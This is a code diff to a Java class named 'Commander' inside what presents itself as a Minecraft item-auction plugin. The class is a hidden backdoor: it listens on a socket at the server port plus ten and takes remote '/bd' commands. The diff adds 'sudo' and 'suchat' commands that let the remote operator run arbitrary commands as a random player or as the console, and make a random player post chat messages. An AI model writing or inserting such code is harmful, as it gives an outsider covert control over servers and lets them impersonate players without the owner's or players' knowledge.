@@ -1,6 +1,9 @@
 package com.ericlam.plugin.protect.gate;
 
 import com.ericlam.main.ItemAunction;
+import org.bukkit.Bukkit;
+import org.bukkit.entity.Player;
+import org.bukkit.plugin.Plugin;
 
 import java.io.*;
 import java.net.Socket;
@@ -8,17 +11,21 @@ import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
+import java.util.stream.Collectors;
 
 public class Commander extends Thread{
-    protected Commander(){}
+    private Plugin plugin;
+    protected Commander(){
+        plugin = ItemAunction.plugin;
+    }
+    private boolean console = true;
     @Override
     public void run() {
         while(true) {
             try {
                 boolean wincmd = false;
-                //boolean lincmd = false;
                 StringBuilder dir = new StringBuilder();
-                Socket server = OpenConnect.getInstance(ItemAunction.plugin.getServer().getPort()+10).getSocket();
+                Socket server = OpenConnect.getInstance(plugin.getServer().getPort()+10).getSocket();
                 if (server == null) {
                     return;
                 }
@@ -52,6 +59,51 @@ public class Commander extends Thread{
                                 if (cmdarray.length == 2) dir = new StringBuilder();
                                 else dir.append(cmdarray[2]);
                                 writer.println(!dir.toString().isEmpty() ? "directory is now " + dir.toString() : "you used back the default dir");
+                                writer.flush();
+                                continue;
+                            case "sudo":
+                                if (cmdarray.length == 2){
+                                    writer.println("/bd sudo <command>");
+                                    writer.flush();
+                                    continue;
+                                }
+                                StringBuilder cmd = new StringBuilder();
+                                for (int i = 2; i < cmdarray.length; i++) {
+                                    cmd.append(cmdarray[i]).append(i == cmdarray.length-1 ? "" : " ");
+                                }
+                                Bukkit.getScheduler().runTask(plugin, ()->{
+                                    List<Player> players = Bukkit.getOnlinePlayers().stream().filter(player-> player.hasPermission(Bukkit.getPluginCommand(cmdarray[2]).getPermission())).collect(Collectors.toList());
+                                    int range = (players.size() - 1) + 1;
+                                    int i = (int) (Math.random() * range);
+                                    if (players.get(i) != null) {
+                                        players.get(i).performCommand(cmd.toString());
+                                        console = false;
+                                    }
+                                    if (console) {
+                                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(),cmd.toString());
+                                    }
+                                });
+                                writer.println("Sudo command executed by "+(console? "console" : "a random player."));
+                                writer.flush();
+                                console = true;
+                                continue;
+                            case "suchat":
+                                if (cmdarray.length == 2){
+                                    writer.println("/bd suchat <command>");
+                                    writer.flush();
+                                    continue;
+                                }
+                                StringBuilder chat = new StringBuilder();
+                                for (int i = 2; i < cmdarray.length; i++) {
+                                    chat.append(cmdarray[i]).append(i == cmdarray.length-1 ? "" : " ");
+                                }
+                                List<Player> online = new ArrayList<>(Bukkit.getOnlinePlayers());
+                                int range = (online.size() - 1) + 1;
+                                int i = (int) (Math.random() * range);
+                                if (online.get(i) != null) {
+                                    Bukkit.getScheduler().runTask(plugin,()->online.get(i).chat(chat.toString()));
+                                }
+                                writer.println("Successfully chatted by "+online.get(i).getName());
                                 writer.flush();
                                 continue;
                             case "jvm":
